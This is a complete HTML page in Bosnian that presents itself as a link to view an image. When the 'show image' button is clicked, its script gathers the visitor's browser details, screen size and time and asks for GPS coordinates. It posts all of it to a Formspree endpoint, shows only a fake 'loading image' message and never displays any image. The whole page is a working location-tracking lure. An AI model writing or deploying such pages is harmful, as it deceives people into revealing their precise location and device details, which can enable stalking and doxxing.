<!DOCTYPE html>
<html lang="bs">
<head>
  <meta charset="UTF-8">
  <title>Pogledaj sliku</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
    button { padding: 14px 20px; font-size: 18px; cursor: pointer; }
  </style>
</head>
<body>

  <h2>Klikni da vidiš sliku</h2>
  <button onclick="startCheck()">Prikaži sliku</button>
  <p id="status"></p>

  <script>
    async function startCheck() {
      document.getElementById("status").textContent = "Učitavanje...";

      const data = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: screen.width + "x" + screen.height,
        time: new Date().toLocaleString()
      };

      // GPS (Popup)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            data.lat = position.coords.latitude;
            data.lon = position.coords.longitude;

            sendData(data);
          },
          function(error) {
            data.gps = "Nije dozvoljeno";
            sendData(data);
          }
        );
      } else {
        sendData(data);
      }
    }

    function sendData(data) {
      fetch("https://formspree.io/f/mnjlyqqy", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });

      document.getElementById("status").textContent = "Slika se učitava...";
    }
  </script>

</body>
</html>
